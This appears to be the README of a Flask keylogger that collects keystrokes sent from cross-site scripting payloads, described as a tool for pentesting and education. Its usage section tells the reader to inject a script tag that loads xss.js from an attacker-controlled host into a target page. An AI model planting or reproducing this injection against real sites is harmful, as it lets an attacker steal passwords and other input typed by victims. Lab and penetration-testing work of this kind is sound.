# Simple Flask Keylogger for XSS

## Overview
This is a minimal Flask application designed for pentesting and educational purposes. It captures keystrokes sent via XSS payloads and prints the reconstructed typed text to the console. The app groups keystrokes based on a configurable idle timeout to help reconstruct words and sentences typed by the user.

---

## What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability typically found in web applications that allows attackers to inject malicious scripts into webpages viewed by other users. By injecting JavaScript, an attacker can capture user inputs such as keystrokes, cookies, or other sensitive data. This app simulates the backend to capture such keystroke data sent from a victim’s browser during an XSS attack for lab/testing purposes only.

---

## Features

- Listens for incoming HTTP GET requests containing keystrokes as query parameters.
- Buffers keystrokes per client IP and prints the buffered string after a configurable idle timeout.
- Serves the JavaScript payload (`xss.js`) from the same Flask server.
- Prints captured keystrokes with timestamps to the console in grouped bursts.

---

## Usage

1. Clone this repository.
2. Install dependencies:
   ```pip install flask```
3. Run the Flask app (default port 80):
  ```sudo python3 app.py```
4. Inject the following script tag on your target page (adjust IP/port as needed):
  ```<script src="http://YOUR_IP/xss.js"></script>```
